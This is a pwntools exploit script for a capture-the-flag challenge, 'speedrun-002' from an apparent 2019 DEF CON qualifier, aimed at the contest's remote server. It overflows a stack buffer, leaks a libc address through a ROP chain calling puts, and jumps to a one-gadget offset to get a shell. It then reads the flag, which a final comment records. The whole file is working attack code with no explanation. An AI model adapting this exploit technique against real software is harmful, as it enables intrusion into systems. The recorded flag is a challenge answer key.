from pwn import *
puts=0x0000000004005B0
rdi=0x00000000004008a3
got=0x000000000601028
reuse=0x00000000040074C
#context.log_level='debug'
libc=ELF("./libc6_2.27-3ubuntu1_amd64.so")
#p=process('./speedrun-002')
pay1=p64(rdi)+p64(got)+p64(puts)+p64(reuse)
p=remote("speedrun-002.quals2019.oooverflow.io",31337)
p.sendafter("now?\n","Everything intelligent is so boring.")
p.sendafter("me more.\n",'\x00'*0x408+pay1)
p.readuntil("ing.\n")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.sym['puts']
log.info(hex(base))
#gdb.attach(p,'')
#raw_input()
p.sendafter("now?\n","Everything intelligent is so boring.")
pay2=p64(base+0x4f322)
p.sendafter("me more.\n",'\x00'*0x408+pay2)
sleep(0.8)
p.sendline("cat flag")
p.interactive()
#OOO{I_didn't know p1zzA places__mAde pwners.}
